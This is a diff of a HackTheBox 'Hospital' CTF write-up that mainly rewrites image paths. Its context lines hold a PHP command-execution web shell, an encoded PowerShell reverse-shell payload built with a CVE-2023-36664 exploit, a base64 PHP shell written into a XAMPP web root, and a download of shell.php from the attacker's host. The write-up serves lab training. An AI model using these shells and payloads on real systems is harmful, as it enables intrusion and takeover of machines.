@@ -1,6 +1,5 @@
 ---
 title: Hospital HTB (English)
-img_path: /assets/img/Anexos/
 image: /assets/img/Anexos/Máquina%20Hospital.png
 description: Hospital HTB Machine [Difuculty medium]
 categories: [CTF,HackTheBox]
@@ -14,7 +13,7 @@ Hospital is a medium-difficulty Windows machine that hosts an Active Directory e
 
 ### Machine Description
 
-![](Máquina%20Hospital-33.png)
+![](/assets/img/Anexos/Máquina%20Hospital-33.png)
 
 - Name: Hospital
 - Goal: Get two flags
@@ -139,7 +138,8 @@ Nmap done: 1 IP address (1 host up) scanned in 210.39 seconds
 
 Nmap reported us a bunch of ports and services. We have two domains that we can note in _/etc/hosts_
 
-![](Máquina%20Hospital-3.png)
+![](/assets/img/Anexos/Máquina%20Hospital-3.png)
+
 Apparently is Linux, but some services do not say the same, we can verify it doing a ping
 
 ```shell
@@ -154,33 +154,36 @@ The ttl is _127_ so probably is a Linux inside a Windows.
 
 At https we se a Webmail, nothing to do here for now.
 
-![](Máquina%20Hospital-4.png)
+![](/assets/img/Anexos/Máquina%20Hospital-4.png)
 
 At http we a login, we can enumerate users when creating an account but for know lets make an account.
-![](Máquina%20Hospital-5.png)
 
-![](Máquina%20Hospital-6.png)
+![](/assets/img/Anexos/Máquina%20Hospital-5.png)
 
-![](Máquina%20Hospital-7.png)
+![](/assets/img/Anexos/Máquina%20Hospital-6.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-7.png)
 
 
 Once in, we can only upload files so lets do it:
-![](Máquina%20Hospital-8.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-8.png)
 
 We can only upload png files and they all are storage in /uploads directory
-![](Máquina%20Hospital-9.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-9.png)
 
 
-![](Máquina%20Hospital-10.png)
+![](/assets/img/Anexos/Máquina%20Hospital-10.png)
 
 Trying we see that a withe list exists so we can fuzz extensions using `fuff`
 
 
-![](Máquina%20Hospital-11.png)
+![](/assets/img/Anexos/Máquina%20Hospital-11.png)
 
-![](Máquina%20Hospital-12.png)
+![](/assets/img/Anexos/Máquina%20Hospital-12.png)
 
-![](Máquina%20Hospital-13.png)
+![](/assets/img/Anexos/Máquina%20Hospital-13.png)
 
 
 ```shell
@@ -204,16 +207,17 @@ phtm                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 768
 ```
 
 After the fuzzing, we know now that we can upload phar and phtm files which can execute php so lets try:
-![](Máquina%20Hospital-14.png)
 
-![](Máquina%20Hospital-15.png)
+![](/assets/img/Anexos/Máquina%20Hospital-14.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-15.png)
 
 We cannot see the output so lets see phpinfo
 
-![](Máquina%20Hospital-16.png)
+![](/assets/img/Anexos/Máquina%20Hospital-16.png)
 
 
-![](Máquina%20Hospital-17.png)
+![](/assets/img/Anexos/Máquina%20Hospital-17.png)
 
 A bunch of functions are disabled. In order to bypass this y use the next dangerous extensions dictionary and using php I can see which one are enabled. 
 
@@ -233,7 +237,7 @@ foreach ($functions as $f) {
 ?>
 ```
 
-![](Máquina%20Hospital-18.png)
+![](/assets/img/Anexos/Máquina%20Hospital-18.png)
 
 
 
@@ -248,12 +252,13 @@ $fp = popen(base64_decode($_GET['cm']),"r");{while(!feof($fp)){$result.=fread($f
 ?>
 ```
 
-![](Máquina%20Hospital-19.png)
+![](/assets/img/Anexos/Máquina%20Hospital-19.png)
 
 And now the reverse shell
-![](Máquina%20Hospital-20.png)
 
-![](Máquina%20Hospital-21.png)
+![](/assets/img/Anexos/Máquina%20Hospital-20.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-21.png)
 
 
 
@@ -262,9 +267,10 @@ And now the reverse shell
 
 ## Privilage Escalation  
 Once we're in The Linux machine we can see the mysql root password in the _config.php_ file 
-![](Máquina%20Hospital-24.png)
 
-![](Máquina%20Hospital-23.png)
+![](/assets/img/Anexos/Máquina%20Hospital-24.png)
+
+![](/assets/img/Anexos/Máquina%20Hospital-23.png)
 
 ```shell
 MariaDB [(none)]> show databases;
@@ -394,9 +400,9 @@ $6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7N
 We've got the drwilliams password and we can now go back and login in the webmail
 
 
-![](Máquina%20Hospital-25.png)
+![](/assets/img/Anexos/Máquina%20Hospital-25.png)
 
-![](Máquina%20Hospital-26.png)
+![](/assets/img/Anexos/Máquina%20Hospital-26.png)
 
 In the webmail there is a mail from drbrown telling to us that we need to upload and .eps file to resume the project.  I used the next exploit to make a malicious eps:
 
@@ -407,14 +413,16 @@ python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQ
 ```
 
 
-![](Máquina%20Hospital-27.png)
+![](/assets/img/Anexos/Máquina%20Hospital-27.png)
 
 Waiting drbrown to open the mail, we listen and we get the reverse shell 
 
-![](Máquina%20Hospital-28.png)
+![](/assets/img/Anexos/Máquina%20Hospital-28.png)
+
 Now we're in the Windows. At C:\ we see xampp running
 
-![](Máquina%20Hospital-29.png)
+![](/assets/img/Anexos/Máquina%20Hospital-29.png)
+
 Maybe the admin is running xampp, who knows? So firts lets see if we have permissions in htdocs 
 
 ```powershell
@@ -456,7 +464,7 @@ PD9waHAKCnNoZWxsX2V4ZWMoIndob2FtaSIpOwoKPz4K
 PS C:\> [IO.File]::WriteAllBytes("C:\xampp\htdocs\shell.php",[Convert]::FromBase64String("PD9waHAKCnNoZWxsX2V4ZWMoIndob2FtaSIpOwoKPz4K"))
 ```
 
-![](Máquina%20Hospital-30.png)
+![](/assets/img/Anexos/Máquina%20Hospital-30.png)
 
 nt authority\system is running the service so lets make an reverse shell 
 
@@ -464,8 +472,8 @@ nt authority\system is running the service so lets make an reverse shell
 PS C:\xampp\htdocs>  (New-Object Net.WebClient).DownloadFile('http://10.10.14.14/shell.php','C:\xampp\htdocs\shell.php')
 ```
 
-![](Máquina%20Hospital-31.png)
+![](/assets/img/Anexos/Máquina%20Hospital-31.png)
 
-![](Máquina%20Hospital-32.png)
+![](/assets/img/Anexos/Máquina%20Hospital-32.png)
 
 And we are root in Windows.
